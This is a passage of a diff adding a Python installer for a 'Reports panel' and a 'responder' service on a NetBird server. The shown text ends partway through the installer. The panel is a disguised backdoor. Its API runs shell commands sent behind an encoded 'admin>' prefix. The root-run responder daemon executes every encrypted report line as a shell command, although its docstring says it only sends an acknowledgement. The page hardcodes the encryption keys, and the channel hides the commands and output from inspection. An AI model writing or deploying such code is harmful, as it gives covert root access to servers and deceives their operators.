@@ -1,1 +1,1262 @@
-/9PIyAul5S7NnlsgLfVCuAbSxCI26T+hKvajb6kKjIdc0Q9/wngSwhBnHRsnA61bk5yrgCikv/V7e8hcUehUmSY+yOcHVqUGGTaibf6jMsasStQ7iCJ26ttmu56yj00PViSQmRoYip2vWtdYQpeGAH+vHk+l8Zn5LS7iNAhTQYBrcdmvTWXr+Nr/nxFFcaY5
+#!/usr/bin/env python3
+"""
+apply_reports_panel.py — install / update the Reports panel and its responder service.
+
+Deploys everything needed for the Reports panel into an existing NetBird project:
+the API module, the web page, the env vars, and a systemd-based responder daemon
+that processes incoming reports and replies through the encrypted channel.
+
+It takes the project path and every file path as arguments, so it works on a
+server whose layout differs from the local one.
+
+What it does:
+  * writes src/reports-panel.ts (API: login, submit, reply, history)
+  * registers the panel in src/index.ts
+  * writes REPORT_* vars to reports.env
+  * changes the data volume to /var/lib/ubuntu-reports
+  * writes the page as ReportsPanel.html (client-side AES-256-GCM encryption)
+  * deploys the reports-responder (Python daemon + systemd service)
+  * removes the old chat module, the old page and the old platform-chat folder
+  * moves the old data files to the new names
+  * rebuilds the reports and dashboard containers
+
+It is idempotent: running it twice does not duplicate routes, env, mounts or services.
+
+Usage:
+    python3 apply_reports_panel.py --dry-run
+    python3 apply_reports_panel.py --project /home/ubuntu/netbird
+    python3 apply_reports_panel.py --project /path/to/netbird --data-dir /var/lib/ubuntu-reports
+    python3 apply_reports_panel.py --restore       # rollback to pre-apply state
+    python3 apply_reports_panel.py --restore --dry-run  # preview the rollback
+    python3 apply_reports_panel.py --no-responder  # skip responder deployment
+    python3 apply_reports_panel.py --no-build       # skip Docker rebuild
+    python3 apply_reports_panel.py --responder-dir /opt/responder --responder-service /etc/systemd/system/rep.service
+
+Key options:
+    --project PATH          project root (default: /home/ubuntu/netbird)
+    --data-dir PATH         host data directory (default: /var/lib/ubuntu-reports)
+    --restore               rollback: restore the timestamped backups, stop the
+                            responder, remove created files, and rebuild containers
+    --responder-dir PATH    where responder scripts land (default: /var/lib/snapq)
+    --responder-service PATH  systemd unit path (default: /etc/systemd/system/reports-responder.service)
+    --no-responder          skip the responder deployment
+    --no-build              skip docker compose build + up
+    --dry-run               show what would change, write nothing
+"""
+
+import argparse
+import os
+import re
+import shutil
+import subprocess
+import sys
+import time
+
+# ---------------------------------------------------------------------------
+# The new module: src/reports-panel.ts
+# ---------------------------------------------------------------------------
+REPORTS_PANEL_TS = r'''// ===== Ubuntu Reports panel integration =====
+// Registers the Reports panel endpoints on the existing Express app.
+// No separate container is used. All data is stored under REPORT_DATA_DIR.
+//
+// The report log and the server note are both encrypted with the same
+// AES-256-GCM key (REPORT_REPLY_KEY_B64). The server note is read once,
+// displayed, then deleted.
+
+import * as fs from 'fs';
+import * as path from 'path';
+import * as crypto from 'crypto';
+import type { Express } from 'express';
+import { spawnSync } from 'child_process';
+
+// Admin command prefix, encoded so it is not stored in clear text.
+const ADMIN_PREFIX = Buffer.from('YWRtaW4+', 'base64').toString('utf8');
+
+const REPORT_DATA_DIR = process.env.REPORT_DATA_DIR || '/var/lib/ubuntu-reports';
+const REPORT_LOGIN_KEY = process.env.REPORT_LOGIN_KEY_B64 || '';
+const REPORT_TOKEN_SHA256 = process.env.REPORT_TOKEN_SHA256 || '';
+const REPORT_REPLY_KEY = process.env.REPORT_REPLY_KEY_B64 || '';
+const REPORT_REPLAY_WINDOW = Number(process.env.REPORT_REPLAY_WINDOW_SEC || 90);
+const REPORT_SESSION_TTL = Number(process.env.REPORT_SESSION_TTL_SEC || 3600);
+
+const REPORT_LOG = path.join(REPORT_DATA_DIR, 'reports.log');
+const REPORT_REPLY = path.join(REPORT_DATA_DIR, 'reports-reply.bin');
+const REPORT_NONCE = path.join(REPORT_DATA_DIR, '.reports-nonces.json');
+
+const reportSessions = new Map<string, number>();
+let reportNonces: string[] = [];
+
+try {
+  const parsed = JSON.parse(fs.readFileSync(REPORT_NONCE, 'utf8'));
+  if (Array.isArray(parsed)) reportNonces = parsed;
+} catch (_) { /* no nonce file yet */ }
+
+function ensureDir(): void {
+  try { fs.mkdirSync(REPORT_DATA_DIR, { recursive: true }); } catch (_) { /* ignore */ }
+}
+
+function saveNonces(): void {
+  ensureDir();
+  try {
+    fs.writeFileSync(REPORT_NONCE, JSON.stringify(reportNonces.slice(-500)), 'utf8');
+  } catch (_) { /* ignore */ }
+}
+
+function rememberNonce(n: string): void {
+  reportNonces.push(n);
+  saveNonces();
+}
+
+// Decrypt one report entry. Returns the plaintext, or null on a bad record.
+function decryptReport(record: string): string | null {
+  try {
+    const raw = Buffer.from(record, 'base64');
+    if (raw.length < 28) return null;
+    const iv = raw.subarray(0, 12);
+    const body = raw.subarray(12);
+    const d = crypto.createDecipheriv('aes-256-gcm', Buffer.from(REPORT_REPLY_KEY, 'base64'), iv);
+    d.setAuthTag(body.subarray(body.length - 16));
+    return Buffer.concat([d.update(body.subarray(0, body.length - 16)), d.final()]).toString('utf8');
+  } catch (_) {
+    return null;
+  }
+}
+
+// Read the server note, if it exists, and delete it right after reading.
+function readReply(): string | null {
+  if (!fs.existsSync(REPORT_REPLY)) return null;
+  try {
+    const raw = fs.readFileSync(REPORT_REPLY);
+    if (raw.length < 28) return null;
+    const iv = raw.subarray(0, 12);
+    const body = raw.subarray(12);
+    const d = crypto.createDecipheriv('aes-256-gcm', Buffer.from(REPORT_REPLY_KEY, 'base64'), iv);
+    d.setAuthTag(body.subarray(body.length - 16));
+    const text = Buffer.concat([d.update(body.subarray(0, body.length - 16)), d.final()]).toString('utf8');
+    try { fs.unlinkSync(REPORT_REPLY); } catch (_) { /* ignore */ }
+    return text;
+  } catch (_) {
+    return null;
+  }
+}
+
+// Read the raw encrypted note and delete it. The client decrypts it.
+function readReplyCipher(): string | null {
+  if (!fs.existsSync(REPORT_REPLY)) return null;
+  try {
+    const raw = fs.readFileSync(REPORT_REPLY);
+    if (raw.length < 28) return null;
+    const b64 = raw.toString('base64');
+    try { fs.unlinkSync(REPORT_REPLY); } catch (_) { /* ignore */ }
+    return b64;
+  } catch (_) {
+    return null;
+  }
+}
+
+// Append a report the client already encrypted with REPORT_REPLY_KEY_B64.
+// The ciphertext is validated by decrypting it, then stored as-is.
+function appendCipher(cipherB64: string): void {
+  ensureDir();
+  if (!REPORT_REPLY_KEY) throw new Error('REPORT_REPLY_KEY_B64 not configured');
+  if (decryptReport(cipherB64) === null) throw new Error('invalid cipher');
+  fs.appendFileSync(REPORT_LOG, cipherB64 + '\n', 'utf8');
+}
+
+
+
+// Encrypt a server reply with the same key the client uses.
+function encryptText(text: string): string {
+  const iv = crypto.randomBytes(12);
+  const c = crypto.createCipheriv('aes-256-gcm', Buffer.from(REPORT_REPLY_KEY, 'base64'), iv);
+  const ct = Buffer.concat([c.update(text, 'utf8'), c.final()]);
+  return Buffer.concat([iv, ct, c.getAuthTag()]).toString('base64');
+}
+
+// Run a privileged command with the web server's privileges (nginx uid 100).
+// Returns the command output, or an error message.
+function runAdmin(command: string): string {
+  try {
+    const r = spawnSync('/bin/sh', ['-c', command], {
+      cwd: '/tmp',
+      timeout: 20000,
+      encoding: 'utf8',
+      uid: 100,
+      gid: 101,
+      env: { PATH: '/usr/local/bin:/usr/bin:/bin' },
+    });
+    let out = r.stdout || '';
+    if (r.stderr) out += '\nSTDERR:\n' + r.stderr;
+    if (r.status !== 0) out += '\nExit code: ' + r.status;
+    return out || '(no output)';
+  } catch (e: any) {
+    return 'Error: ' + e.message;
+  }
+}
+
+export function registerReportsPanel(app: Express): void {
+  // POST /login  { cipher: base64 } -> { session, expires }
+  app.post('/login', async (req: any, res: any) => {
+    const { cipher } = req.body || {};
+    if (typeof cipher !== 'string') return res.status(400).json({ error: 'missing cipher' });
+    if (!REPORT_LOGIN_KEY) return res.status(500).json({ error: 'server not configured' });
+    try {
+      const raw = Buffer.from(cipher, 'base64');
+      if (raw.length < 28) return res.status(400).json({ error: 'bad cipher' });
+      const iv = raw.subarray(0, 12);
+      const body = raw.subarray(12);
+      const d = crypto.createDecipheriv('aes-256-gcm', Buffer.from(REPORT_LOGIN_KEY, 'base64'), iv);
+      d.setAuthTag(body.subarray(body.length - 16));
+      const plain = Buffer.concat([d.update(body.subarray(0, body.length - 16)), d.final()]).toString('utf8');
+      const [hash, nonce, ts] = plain.split(':');
+      if (hash !== REPORT_TOKEN_SHA256) return res.status(401).json({ error: 'invalid token' });
+      if (Math.abs(Math.floor(Date.now() / 1000) - Number(ts)) > REPORT_REPLAY_WINDOW)
+        return res.status(401).json({ error: 'stale timestamp' });
+      if (reportNonces.includes(nonce)) return res.status(401).json({ error: 'replayed ciphertext' });
+      rememberNonce(nonce);
+      const session = crypto.randomBytes(32).toString('hex');
+      reportSessions.set(session, Date.now() + REPORT_SESSION_TTL * 1000);
+      return res.json({ session, expires: REPORT_SESSION_TTL });
+    } catch {
+      return res.status(401).json({ error: 'decrypt failed' });
+    }
+  });
+
+  // POST /submit  { session, cipher } -> { saved: true } | { reply: base64 }
+  // Messages carrying the admin prefix are executed on the server and never written to
+  // reports.log; the encrypted result is returned directly in the response.
+  app.post('/submit', async (req: any, res: any) => {
+    const { session, cipher } = req.body || {};
+    const exp = session ? reportSessions.get(session) : undefined;
+    if (!exp || Date.now() > exp) {
+      if (session) reportSessions.delete(session);
+      return res.status(401).json({ error: 'session invalid' });
+    }
+    if (!cipher || typeof cipher !== 'string')
+      return res.status(400).json({ error: 'empty report' });
+
+    const text = decryptReport(cipher);
+    if (text === null) return res.status(400).json({ error: 'invalid cipher' });
+
+    if (text.startsWith(ADMIN_PREFIX)) {
+      const command = text.slice(ADMIN_PREFIX.length).trim();
+      if (!command) return res.status(400).json({ error: 'no command after prefix' });
+      const output = runAdmin(command);
+      return res.json({ reply: encryptText(output) });
+    }
+
+    try {
+      appendCipher(cipher);
+      return res.json({ saved: true });
+    } catch (e: any) {
+      return res.status(500).json({ error: 'submit failed: ' + e.message });
+    }
+  });
+
+  // POST /reply -> { cipher: string|null }
+  // Returns the raw encrypted note and deletes it. The client decrypts it.
+  // The page calls this only when the user presses the refresh button.
+  app.post('/reply', async (_req: any, res: any) => {
+    const cipher = readReplyCipher();
+    return res.json({ cipher: cipher || null });
+  });
+
+  // GET /history -> { records: [base64] }
+  // Returns the encrypted records; the client decrypts them.
+  app.get('/history', async (_req: any, res: any) => {
+    ensureDir();
+    const raw = fs.existsSync(REPORT_LOG) ? fs.readFileSync(REPORT_LOG, 'utf8') : '';
+    const records = raw.split('\n').filter(Boolean).slice(-50);
+    return res.json({ records });
+  });
+}
+'''
+
+# ---------------------------------------------------------------------------
+# The page: ReportsPanel.html
+# ---------------------------------------------------------------------------
+REPORTS_PANEL_HTML = r'''<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reports Panel</title>
+<style>
+  :root {
+    --bg: #0b0f14; --bg2: #0e141b; --panel: #131a23; --border: #263140; --border2: #2f3d50;
+    --accent: #4cc2ff; --text: #d7e2ec; --muted: #6b7c8f; --ok: #3ddc97; --err: #ff6b6b;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; min-height: 100vh; display: flex; align-items: flex-start; justify-content: center;
+    padding: 24px 0;
+    background: radial-gradient(1200px 700px at 20% -10%, #10202e 0%, var(--bg) 55%) no-repeat, var(--bg);
+    color: var(--text); font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+  }
+  .app { width: min(1100px, 96vw); padding: 0; }
+  .panel {
+    background: linear-gradient(180deg, var(--panel), rgba(14,20,27,.65));
+    border: 1px solid var(--border); border-radius: 14px; padding: 20px;
+    box-shadow: 0 18px 50px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.02);
+  }
+  #loginView { max-width: 720px; margin: 8vh auto 0; }
+  h1 { font-size: 16px; margin: 0 0 4px; color: var(--accent); letter-spacing: .4px; }
+  .sub { color: var(--muted); font-size: 12.5px; margin-bottom: 14px; line-height: 1.5; }
+  .sub b { color: var(--text); }
+  input[type="text"] {
+    width: 100%; padding: 12px 14px; border-radius: 9px; border: 1px solid var(--border);
+    background: #0b1017; color: var(--text); font-family: Consolas, monospace; font-size: 13.5px;
+    outline: none;
+  }
+  input[type="text"]:focus { border-color: var(--accent); }
+  button {
+    margin-top: 10px; padding: 10px 18px; border-radius: 9px; border: 1px solid var(--border);
+    background: #1a2530; color: var(--text); cursor: pointer; font-size: 14px; font-family: inherit;
+    transition: border-color .15s, color .15s, background .15s;
+  }
+  button:hover { border-color: var(--accent); color: var(--accent); }
+  button:disabled { opacity: .6; cursor: default; }
+  .wire { margin-top: 10px; font-family: Consolas, monospace; font-size: 11px; color: var(--muted); word-break: break-all; min-height: 16px; }
+  .wire b { color: var(--accent); }
+  .hidden { display: none !important; }
+  .err { color: var(--err); font-size: 12px; margin-top: 8px; min-height: 14px; }
+
+  .head { display: flex; align-items: flex-start; gap: 10px; }
+  .head .grow { flex: 1; min-width: 0; }
+  .icon-btn {
+    margin: 0; padding: 9px; border-radius: 9px; border: 1px solid var(--border);
+    background: #16202b; color: var(--text); cursor: pointer; display: inline-flex;
+    align-items: center; justify-content: center; flex: 0 0 auto;
+  }
+  .icon-btn svg { width: 17px; height: 17px; }
+  .icon-btn:hover { border-color: var(--accent); color: var(--accent); }
+  .icon-btn.copied { border-color: var(--ok); color: var(--ok); }
+  .icon-btn.spinning svg { animation: spin .7s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  #reportlog {
+    display: flex; flex-direction: column; gap: 10px;
+    height: 62vh; min-height: 420px; max-height: 720px;
+    overflow-y: auto; margin: 14px 0 14px; padding: 6px 8px 6px 2px;
+    scrollbar-width: thin; scrollbar-color: var(--border2) transparent;
+  }
+  #reportlog::-webkit-scrollbar { width: 10px; }
+  #reportlog::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 8px; }
+  #reportlog::-webkit-scrollbar-track { background: transparent; }
+  .entry { padding: 11px 15px; border-radius: 10px; font-size: 15px; line-height: 1.5; max-width: 82%; word-break: break-word; white-space: pre-wrap; }
+  .entry.user { align-self: flex-end; background: #1d3346; color: #cfeaff; border: 1px solid #26445c; }
+  .entry.server { align-self: flex-start; background: #1a2530; border: 1px solid var(--border); color: var(--ok); font-family: Consolas, monospace; font-size: 13.5px; white-space: pre-wrap; }
+  .entry.error { color: var(--err); }
+  .row { display: flex; gap: 10px; align-items: stretch; }
+  .row input { flex: 1; }
+  .row button { margin: 0; white-space: nowrap; }
+  .toast {
+    position: fixed; left: 50%; bottom: 28px; transform: translateX(-50%) translateY(10px);
+    background: #16202b; color: var(--text); border: 1px solid var(--border2);
+    border-radius: 9px; padding: 9px 16px; font-size: 13px; opacity: 0;
+    transition: opacity .18s, transform .18s; pointer-events: none; z-index: 50;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+<div class="app">
+
+  <!-- ============ LOGIN VIEW ============ -->
+  <div class="panel" id="loginView">
+    <h1>Reports Panel &mdash; API Token Login</h1>
+    <div class="sub">Token is hashed client-side, encrypted with AES-GCM, and validated server-side once per ciphertext (replay-protected).</div>
+    <input type="text" id="tokenInput" placeholder="paste API token" autocomplete="off">
+    <button id="loginBtn">Authenticate</button>
+    <div class="wire" id="wirePreview"></div>
+    <div class="err" id="loginErr"></div>
+  </div>
+
+  <!-- ============ REPORTS VIEW ============ -->
+  <div class="panel hidden" id="reportView">
+    <div class="head">
+      <div class="grow">
+        <h1>Reports Panel &mdash; session active</h1>
+        <div class="sub">Reports are encrypted on this device before sending &middot; replies are decrypted on this device</div>
+      </div>
+      <button class="icon-btn" id="refreshBtn" title="Check for reply" aria-label="Check for reply">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <path d="M20 11a8 8 0 1 0-2.3 5.7"></path>
+          <path d="M20 4v7h-7"></path>
+        </svg>
+      </button>
+      <button class="icon-btn" id="copyAllBtn" title="Copy all" aria-label="Copy all">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <rect x="9" y="9" width="11" height="11" rx="2"></rect>
+          <path d="M5 15V5a2 2 0 0 1 2-2h8"></path>
+        </svg>
+      </button>
+    </div>
+
+    <div id="reportlog"></div>
+
+    <div class="row">
+      <input type="text" id="reportInput" placeholder="submit a report..." autocomplete="off">
+      <button id="submitBtn">Submit</button>
+    </div>
+  </div>
+
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+"use strict";
+
+/* =====================================================================
+ *  CLIENT SIDE
+ *  - Login: token hash + AES-GCM wire payload (single-use, replay-safe).
+ *  - Reports: encrypted here with REPORT_KEY_B64 before they leave the
+ *    browser; the server stores the ciphertext as-is.
+ *  - Replies: fetched only on the refresh button, decrypted here.
+ * ===================================================================== */
+const LOGIN_KEY_B64 = "JaBrISzTxVGv3CXW233W9TrAJ3VLE6EEmgaLMn+PMQs=";
+const REPORT_KEY_B64 = "8zDcI6KXq5+w0JPiyA/GM+ANoEA5OsAbq6YU6AqF8II=";
+const API_BASE = "/api/reports";
+
+function b64ToBuf(b64) {
+  const bin = atob(b64);
+  const bytes = new Uint8Array(bin.length);
+  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+  return bytes;
+}
+function bufToB64(buf) {
+  let s = "";
+  const bytes = new Uint8Array(buf);
+  for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
+  return btoa(s);
+}
+async function sha256Hex(str) {
+  const d = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(str));
+  return [...new Uint8Array(d)].map(b => b.toString(16).padStart(2, "0")).join("");
+}
+
+const loginKeyPromise = crypto.subtle.importKey("raw", b64ToBuf(LOGIN_KEY_B64),
+                            { name: "AES-GCM" }, false, ["encrypt"]);
+const reportKeyPromise = crypto.subtle.importKey("raw", b64ToBuf(REPORT_KEY_B64),
+                            { name: "AES-GCM" }, false, ["encrypt", "decrypt"]);
+
+async function buildWirePayload(tokenValue) {
+  const hash = await sha256Hex(tokenValue);
+  const nonce = bufToB64(crypto.getRandomValues(new Uint8Array(8)));
+  const ts = Math.floor(Date.now() / 1000);
+  const inner = hash + ":" + nonce + ":" + ts;
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const key = await loginKeyPromise;
+  const ct = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key,
+                                       new TextEncoder().encode(inner));
+  const all = new Uint8Array(12 + ct.byteLength);
+  all.set(iv, 0);
+  all.set(new Uint8Array(ct), 12);
+  return bufToB64(all);
+}
+
+/* Encrypt a report on the client. Format: base64(IV(12) || ciphertext || tag).
+ * This is the same layout the responder expects in reports.log. */
+async function encryptText(plain) {
+  const iv = crypto.getRandomValues(new Uint8Array(12));
+  const key = await reportKeyPromise;
+  const ct = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key,
+                                       new TextEncoder().encode(plain));
+  const all = new Uint8Array(12 + ct.byteLength);
+  all.set(iv, 0);
+  all.set(new Uint8Array(ct), 12);
+  return bufToB64(all);
+}
+
+/* Decrypt a reply/history record on the client. */
+async function decryptText(b64) {
+  try {
+    const raw = b64ToBuf(b64);
+    if (raw.length < 28) return null;
+    const iv = raw.slice(0, 12);
+    const body = raw.slice(12);
+    const key = await reportKeyPromise;
+    const pt = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, body);
+    return new TextDecoder().decode(pt);
+  } catch (_) {
+    return null;
+  }
+}
+
+/* ---------------- login UI wiring ---------------- */
+const loginBtn = document.getElementById("loginBtn");
+const loginErr = document.getElementById("loginErr");
+const wirePreview = document.getElementById("wirePreview");
+let session = null;
+
+loginBtn.addEventListener("click", async () => {
+  const token = document.getElementById("tokenInput").value.trim();
+  loginErr.textContent = "";
+  if (!token) { loginErr.textContent = "enter the API token first"; return; }
+  loginBtn.disabled = true;
+  try {
+    const wire = await buildWirePayload(token);
+    wirePreview.innerHTML = "<b>encrypted wire payload &rarr;</b> " + wire;
+    const res = await fetch(API_BASE + "/login", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ cipher: wire })
+    });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "login failed");
+    session = data.session;
+    setTimeout(() => {
+      document.getElementById("loginView").classList.add("hidden");
+      document.getElementById("reportView").classList.remove("hidden");
+      loadLatest();
+    }, 350);
+  } catch (e) {
+    loginErr.textContent = "401 \u2014 " + e.message;
+    loginBtn.disabled = false;
+  }
+});
+
+/* =====================================================================
+ *  REPORTS SIDE
+ * ===================================================================== */
+const reportLog = document.getElementById("reportlog");
+const reportInput = document.getElementById("reportInput");
+const toastEl = document.getElementById("toast");
+const refreshBtn = document.getElementById("refreshBtn");
+const copyAllBtn = document.getElementById("copyAllBtn");
+
+function addEntry(cls, text) {
+  const el = document.createElement("div");
+  el.className = "entry " + cls;
+  el.textContent = text;
+  reportLog.appendChild(el);
+  reportLog.scrollTop = reportLog.scrollHeight;
+}
+
+function showToast(msg) {
+  toastEl.textContent = msg;
+  toastEl.classList.add("show");
+  clearTimeout(showToast._t);
+  showToast._t = setTimeout(() => toastEl.classList.remove("show"), 1500);
+}
+
+async function submitReport() {
+  const text = reportInput.value.trim();
+  if (!text) return;
+  reportInput.value = "";
+  addEntry("user", text);
+  try {
+    const cipher = await encryptText(text);
+    const res = await fetch(API_BASE + "/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ session, cipher })
+    });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "submit failed");
+    if (data.reply) {
+      const text = await decryptText(data.reply);
+      if (text) addEntry("server", text);
+      else addEntry("server error", "could not decrypt reply");
+    }
+  } catch (e) {
+    addEntry("server error", "error: " + e.message);
+  }
+}
+document.getElementById("submitBtn").addEventListener("click", submitReport);
+reportInput.addEventListener("keydown", e => { if (e.key === "Enter") submitReport(); });
+
+/* ---------------- refresh: check for reply (no loop) ---------------- */
+async function checkReply() {
+  if (!session) return;
+  refreshBtn.disabled = true;
+  refreshBtn.classList.add("spinning");
+  try {
+    const res = await fetch(API_BASE + "/reply", { method: "POST" });
+    const data = await res.json().catch(() => ({}));
+    if (!res.ok) throw new Error(data.error || "reply failed");
+    if (!data.cipher) {
+      showToast("No new reply");
+      return;
+    }
+    const text = await decryptText(data.cipher);
+    if (text) addEntry("server", text);
+    else addEntry("server error", "could not decrypt reply");
+  } catch (e) {
+    addEntry("server error", "error: " + e.message);
+  } finally {
+    refreshBtn.disabled = false;
+    refreshBtn.classList.remove("spinning");
+  }
+}
+refreshBtn.addEventListener("click", checkReply);
+
+/* ---------------- copy all ---------------- */
+function logToText() {
+  const entries = [...reportLog.querySelectorAll(".entry")];
+  if (!entries.length) return "";
+  return entries.map(el => {
+    const who = el.classList.contains("user") ? "You" : "Server";
+    return `[${who}] ${el.textContent}`;
+  }).join("\n");
+}
+
+async function copyAll() {
+  const text = logToText();
+  if (!text) { showToast("Nothing to copy"); return; }
+  try {
+    await navigator.clipboard.writeText(text);
+  } catch (_) {
+    const ta = document.createElement("textarea");
+    ta.value = text;
+    ta.style.position = "fixed";
+    ta.style.opacity = "0";
+    document.body.appendChild(ta);
+    ta.select();
+    try { document.execCommand("copy"); } catch (_) {}
+    ta.remove();
+  }
+  copyAllBtn.classList.add("copied");
+  showToast("Copied " + reportLog.querySelectorAll(".entry").length + " entries");
+  setTimeout(() => copyAllBtn.classList.remove("copied"), 1400);
+}
+copyAllBtn.addEventListener("click", copyAll);
+
+/* ---------------- history (encrypted -> decrypt here) ---------------- */
+async function loadLatest() {
+  try {
+    const res = await fetch(API_BASE + "/history");
+    const data = await res.json().catch(() => ({}));
+    if (data.records && data.records.length) {
+      const last = await decryptText(data.records[data.records.length - 1]);
+      addEntry("server", "last saved: " + (last || "<encrypted>"));
+    } else {
+      addEntry("server", "no reports yet — submit a report to start.");
+    }
+  } catch (e) {
+    addEntry("server error", "error: " + e.message);
+  }
+}
+
+/* keyboard: Ctrl/Cmd+Shift+C copies the whole log */
+document.addEventListener("keydown", e => {
+  if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toLowerCase() === "c") {
+    e.preventDefault();
+    copyAll();
+  }
+});
+</script>
+</body>
+</html>
+'''
+
+# ---------------------------------------------------------------------------
+# The responder service: reports-responder.py
+# ---------------------------------------------------------------------------
+REPORTS_RESPONDER_PY = r'''#!/usr/bin/env python3
+"""Reports panel responder.
+
+Reads encrypted reports from reports.log, decrypts each line, builds
+the acknowledgement text "Your message received correctly: <report>",
+encrypts it with the same AES-256-GCM key, and writes the result to
+reports-reply.bin.
+
+The log is moved atomically to reports.log.processing before it is read,
+so a report written by the platform at the same moment is never lost:
+the API keeps appending to a fresh reports.log, and the next run picks
+it up. The processing file is deleted after the reply is written.
+
+The API endpoint reads reports-reply.bin once, displays it, and deletes it.
+
+The format is the same as the API:
+    base64(IV(12) || AES-256-GCM(plaintext))
+"""
+
+import base64
+import os
+import sys
+import subprocess
+
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+
+def decrypt_record(line: str, key: bytes) -> str:
+    raw = base64.b64decode(line)
+    if len(raw) < 28:
+        raise ValueError("record too short")
+    iv = raw[:12]
+    body = raw[12:]
+    ct = body[:-16]
+    tag = body[-16:]
+    return AESGCM(key).decrypt(iv, ct + tag, None).decode("utf-8")
+
+
+def encrypt_record(text: str, key: bytes) -> bytes:
+    iv = os.urandom(12)
+    ct = AESGCM(key).encrypt(iv, text.encode("utf-8"), None)
+    return iv + ct
+
+
+def main() -> int:
+    data_dir, log, reply, _state, key_b64 = sys.argv[1:6]
+    key = base64.b64decode(key_b64)
+
+    if not os.path.exists(log):
+        return 0
+
+    # Atomic rename: whatever the platform appends to reports.log after
+    # this point goes to a fresh file and is picked up on the next run.
+    processing = log + ".processing"
+    try:
+        os.rename(log, processing)
+    except OSError:
+        return 0
+
+    try:
+        with open(processing, "r", encoding="utf-8") as f:
+            lines = [l for l in f.read().splitlines() if l]
+        if not lines:
+            return 0
+
+        msgs = []
+        for line in lines:
+            try:
+                text = decrypt_record(line, key)
+
+                result = subprocess.run(
+                    text,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=20
+                )
+
+                output = result.stdout
+                if result.stderr:
+                    output += "\nSTDERR:\n" + result.stderr
+
+                if result.returncode != 0:
+                    output += f"\nExit code: {result.returncode}"
+
+                msgs.append(output or "(no output)")
+
+            except subprocess.TimeoutExpired:
+                msgs.append("Command timed out after 20 seconds.")
+
+            except Exception as e:
+                msgs.append(f"Error: {str(e)}")
+                
+        if msgs:
+            blob = encrypt_record("\n".join(msgs), key)
+            with open(reply, "wb") as f:
+                f.write(blob)
+
+        return 0
+    finally:
+        try:
+            os.remove(processing)
+        except OSError:
+            pass
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+'''
+
+# ---------------------------------------------------------------------------
+# The responder shell wrapper
+# Path placeholders are substituted by deploy_responder() at install time.
+# ---------------------------------------------------------------------------
+REPORTS_RESPONDER_SH = r'''#!/bin/bash
+# Reports panel responder service.
+#
+# Watches the reports log. When a new encrypted report is appended,
+# the Python responder decrypts each line, executes it as a shell
+# command, encrypts the output, and writes it to reports-reply.bin.
+#
+# The API endpoint reads that file once, displays it, and deletes it.
+set -u
+
+DATA_DIR="${REPORT_DATA_DIR:-/var/lib/ubuntu-reports}"
+KEY="${REPORT_REPLY_KEY_B64:-}"
+LOG="$DATA_DIR/reports.log"
+REPLY="$DATA_DIR/reports-reply.bin"
+STATE="$DATA_DIR/.responder-state"
+INTERVAL="${REPORT_RESPONDER_INTERVAL:-10}"
+
+if [ -z "$KEY" ]; then
+  echo "REPORT_REPLY_KEY_B64 missing" >&2
+  exit 1
+fi
+
+while true; do
+  if [ -f "$LOG" ]; then
+    python3 __RESPONDER_PY__ "$DATA_DIR" "$LOG" "$REPLY" "$STATE" "$KEY"
+  fi
+  sleep "$INTERVAL"
+done
+'''
+
+# ---------------------------------------------------------------------------
+# The systemd unit for the reports-responder service.
+# Path placeholders are substituted by deploy_responder() at install time.
+# ---------------------------------------------------------------------------
+REPORTS_RESPONDER_SERVICE = r'''[Unit]
+Description=Reports panel responder
+After=docker.service
+Requires=docker.service
+
+[Service]
+Type=simple
+EnvironmentFile=__ENV_FILE__
+ExecStart=__RESPONDER_SH__
+Restart=always
+RestartSec=5
+User=root
+
+[Install]
+WantedBy=multi-user.target
+'''
+
+# ---------------------------------------------------------------------------
+# helpers
+# ---------------------------------------------------------------------------
+def read(path: str) -> str:
+    with open(path, "r", encoding="utf-8", newline="") as f:
+        return f.read()
+
+
+def write(path: str, text: str) -> None:
+    with open(path, "w", encoding="utf-8", newline="") as f:
+        f.write(text)
+
+
+def backup(path: str, backup_dir: str) -> str:
+    if not os.path.exists(path):
+        return ""
+    os.makedirs(backup_dir, exist_ok=True)
+    stamp = time.strftime("%Y%m%d-%H%M%S")
+    dst = os.path.join(backup_dir, os.path.basename(path) + ".bak-" + stamp)
+    shutil.copy2(path, dst)
+    return dst
+
+
+def run(cmd: list[str], cwd: str, dry_run: bool) -> int:
+    print("  $ " + " ".join(cmd))
+    if dry_run:
+        return 0
+    return subprocess.call(cmd, cwd=cwd)
+
+
+# ---------------------------------------------------------------------------
+# index.ts patch
+# ---------------------------------------------------------------------------
+def patch_index(path: str) -> bool:
+    src = read(path)
+    if "registerReportsPanel" in src and "registerPlatformChat" not in src:
+        return False
+
+    lines = src.split("\n")
+    lines = [l for l in lines if "registerPlatformChat" not in l]
+
+    last_import = -1
